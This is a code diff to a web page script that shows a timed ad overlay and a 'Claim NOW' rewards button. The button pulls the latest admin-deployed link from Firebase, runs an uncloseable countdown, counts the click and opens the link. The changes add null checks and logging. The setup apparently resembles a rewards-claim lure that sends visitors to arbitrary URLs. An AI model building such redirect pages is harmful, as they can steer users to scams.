@@ -15,6 +15,8 @@ firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
 
 document.addEventListener('DOMContentLoaded', function() {
+    console.log('DOM loaded - Initializing...');
+
     // ========== INITIAL AD OVERLAY - Appears after 5 seconds ==========
     const initialAdOverlay = document.getElementById('initialAdOverlay');
     const initialAdClose = document.getElementById('initialAdClose');
@@ -23,7 +25,8 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Show initial ad after 5 seconds
     setTimeout(() => {
-        if (!initialAdShown) {
+        if (!initialAdShown && initialAdOverlay) {
+            console.log('Showing initial ad');
             initialAdOverlay.classList.add('active');
             document.body.style.overflow = 'hidden';
             initialAdShown = true;
@@ -32,34 +35,42 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Close initial ad function
     function closeInitialAd() {
-        initialAdOverlay.classList.remove('active');
-        document.body.style.overflow = '';
-        setTimeout(() => {
-            showToast('✨ Check out your exclusive rewards!');
-        }, 400);
+        if (initialAdOverlay) {
+            initialAdOverlay.classList.remove('active');
+            document.body.style.overflow = '';
+            setTimeout(() => {
+                showToast('✨ Check out your exclusive rewards!');
+            }, 400);
+        }
     }
     
-    initialAdClose.addEventListener('click', closeInitialAd);
+    if (initialAdClose) {
+        initialAdClose.addEventListener('click', closeInitialAd);
+    }
     
-    initialAdCta.addEventListener('click', function() {
-        closeInitialAd();
-        setTimeout(() => {
-            const claimBtn = document.getElementById('claimBtn');
-            if (claimBtn) {
-                claimBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                claimBtn.style.boxShadow = '0 0 80px rgba(46, 242, 163, 0.5), 0 0 160px rgba(46, 242, 163, 0.15)';
-                setTimeout(() => {
-                    claimBtn.style.boxShadow = '';
-                }, 2000);
-            }
-        }, 500);
-    });
-    
-    initialAdOverlay.addEventListener('click', function(e) {
-        if (e.target === this) {
+    if (initialAdCta) {
+        initialAdCta.addEventListener('click', function() {
             closeInitialAd();
-        }
-    });
+            setTimeout(() => {
+                const claimBtn = document.getElementById('claimBtn');
+                if (claimBtn) {
+                    claimBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    claimBtn.style.boxShadow = '0 0 80px rgba(46, 242, 163, 0.5), 0 0 160px rgba(46, 242, 163, 0.15)';
+                    setTimeout(() => {
+                        claimBtn.style.boxShadow = '';
+                    }, 2000);
+                }
+            }, 500);
+        });
+    }
+    
+    if (initialAdOverlay) {
+        initialAdOverlay.addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeInitialAd();
+            }
+        });
+    }
 
     // ========== CLAIM POPUP WITH COUNTDOWN ==========
     const claimBtn = document.getElementById('claimBtn');
@@ -70,14 +81,17 @@ document.addEventListener('DOMContentLoaded', function() {
     let countdownInterval = null;
     let popupActive = false;
 
-    // Function to get the latest link and handle click
+    console.log('Claim button found:', !!claimBtn);
+
+    // Function to get the latest link
     function getLatestLink() {
         return new Promise((resolve, reject) => {
             database.ref('links').orderByChild('createdAt').limitToLast(1).once('value')
                 .then((snapshot) => {
                     const links = snapshot.val();
+                    console.log('Links from Firebase:', links);
                     if (!links) {
-                        reject(new Error('No active link available'));
+                        reject(new Error('No active link available. Please deploy a link in the admin panel.'));
                         return;
                     }
                     const linkId = Object.keys(links)[0];
@@ -85,6 +99,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     resolve({ linkId, linkData });
                 })
                 .catch((error) => {
+                    console.error('Error fetching link:', error);
                     reject(error);
                 });
         });
@@ -96,9 +111,11 @@ document.addEventListener('DOMContentLoaded', function() {
         const circumference = 339.292; // 2 * PI * 54
         
         // Set initial state
-        countdownNumber.textContent = count;
-        timerValue.textContent = count;
-        countdownProgress.style.strokeDashoffset = 0;
+        if (countdownNumber) countdownNumber.textContent = count;
+        if (timerValue) timerValue.textContent = count;
+        if (countdownProgress) {
+            countdownProgress.style.strokeDashoffset = 0;
+        }
         
         // Clear any existing interval
         if (countdownInterval) {
@@ -108,27 +125,38 @@ document.addEventListener('DOMContentLoaded', function() {
         countdownInterval = setInterval(() => {
             count--;
             const progress = (count / 5) * circumference;
-            countdownProgress.style.strokeDashoffset = circumference - progress;
-            countdownNumber.textContent = count;
-            timerValue.textContent = count;
+            if (countdownProgress) {
+                countdownProgress.style.strokeDashoffset = circumference - progress;
+            }
+            if (countdownNumber) countdownNumber.textContent = count;
+            if (timerValue) timerValue.textContent = count;
             
             if (count <= 0) {
                 clearInterval(countdownInterval);
                 countdownInterval = null;
                 
+                console.log('Countdown finished, redirecting...');
+                
                 // Increment click count
                 const newClicks = (linkData.clicks || 0) + 1;
                 database.ref('links/' + linkId + '/clicks').set(newClicks)
                     .then(() => {
+                        console.log('Click count updated:', newClicks);
                         // Close popup and redirect
-                        claimPopupOverlay.classList.remove('active');
+                        if (claimPopupOverlay) {
+                            claimPopupOverlay.classList.remove('active');
+                        }
                         document.body.style.overflow = '';
+                        popupActive = false;
                         window.open(linkData.url, '_blank');
                     })
                     .catch((error) => {
                         console.error('Error updating clicks:', error);
-                        claimPopupOverlay.classList.remove('active');
+                        if (claimPopupOverlay) {
+                            claimPopupOverlay.classList.remove('active');
+                        }
                         document.body.style.overflow = '';
+                        popupActive = false;
                         window.open(linkData.url, '_blank');
                     });
             }
@@ -139,12 +167,19 @@ document.addEventListener('DOMContentLoaded', function() {
     function showPopup(linkId, linkData) {
         if (popupActive) return;
         popupActive = true;
+        console.log('Showing popup for link:', linkData.url);
         
         // Reset countdown
         const circumference = 339.292;
-        countdownProgress.style.strokeDashoffset = 0;
+        if (countdownProgress) {
+            countdownProgress.style.strokeDashoffset = 0;
+        }
+        if (countdownNumber) countdownNumber.textContent = '5';
+        if (timerValue) timerValue.textContent = '5';
         
-        claimPopupOverlay.classList.add('active');
+        if (claimPopupOverlay) {
+            claimPopupOverlay.classList.add('active');
+        }
         document.body.style.overflow = 'hidden';
         
         // Start countdown
@@ -153,7 +188,11 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // Claim button click handler
     if (claimBtn) {
+        console.log('Adding click listener to claim button');
+        
         claimBtn.addEventListener('click', function(e) {
+            console.log('Claim button clicked!');
+            
             // Show loading state
             this.classList.add('loading');
             this.innerHTML = '<span class="btn-icon" style="animation: spin 0.8s linear infinite; width:22px;height:22px;display:inline-block;">⟳</span> Processing...';
@@ -161,6 +200,8 @@ document.addEventListener('DOMContentLoaded', function() {
             // Get the latest link from Firebase
             getLatestLink()
                 .then(({ linkId, linkData }) => {
+                    console.log('Link retrieved successfully:', linkData.url);
+                    
                     // Reset button
                     this.classList.remove('loading');
                     this.innerHTML = '<img src="images/maya_icon.png" alt="Maya" class="btn-icon" /> Claim NOW';
@@ -169,6 +210,8 @@ document.addEventListener('DOMContentLoaded', function() {
                     showPopup(linkId, linkData);
                 })
                 .catch((error) => {
+                    console.error('Error getting link:', error);
+                    
                     // Reset button
                     this.classList.remove('loading');
                     this.innerHTML = '<img src="images/maya_icon.png" alt="Maya" class="btn-icon" /> Claim NOW';
@@ -176,17 +219,21 @@ document.addEventListener('DOMContentLoaded', function() {
                     showToast('⚠️ ' + error.message, true);
                 });
         });
+    } else {
+        console.error('Claim button not found!');
     }
 
     // Close popup manually (optional - user can click outside)
-    claimPopupOverlay.addEventListener('click', function(e) {
-        if (e.target === this && popupActive) {
-            // Don't close during countdown to prevent issues
-            if (countdownInterval) {
-                showToast('⏳ Please wait for the countdown to finish', true);
+    if (claimPopupOverlay) {
+        claimPopupOverlay.addEventListener('click', function(e) {
+            if (e.target === this && popupActive) {
+                // Don't close during countdown to prevent issues
+                if (countdownInterval) {
+                    showToast('⏳ Please wait for the countdown to finish', true);
+                }
             }
-        }
-    });
+        });
+    }
 
     // ========== TOAST FUNCTION ==========
     function showToast(message, isError = false) {
@@ -198,9 +245,6 @@ document.addEventListener('DOMContentLoaded', function() {
         const toast = document.createElement('div');
         toast.className = 'toast-message';
         toast.textContent = message;
-        if (isError) {
-            toast.style.borderColor = 'rgba(255, 50, 50, 0.3)';
-        }
         toast.style.cssText = `
             position: fixed;
             bottom: 30px;
@@ -229,7 +273,7 @@ document.addEventListener('DOMContentLoaded', function() {
             setTimeout(() => {
                 toast.remove();
             }, 300);
-        }, 3000);
+        }, 4000);
     }
 
     // ========== ANIMATION STYLES ==========
@@ -265,4 +309,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     `;
     document.head.appendChild(style);
+    
+    console.log('Script initialized successfully');
 });
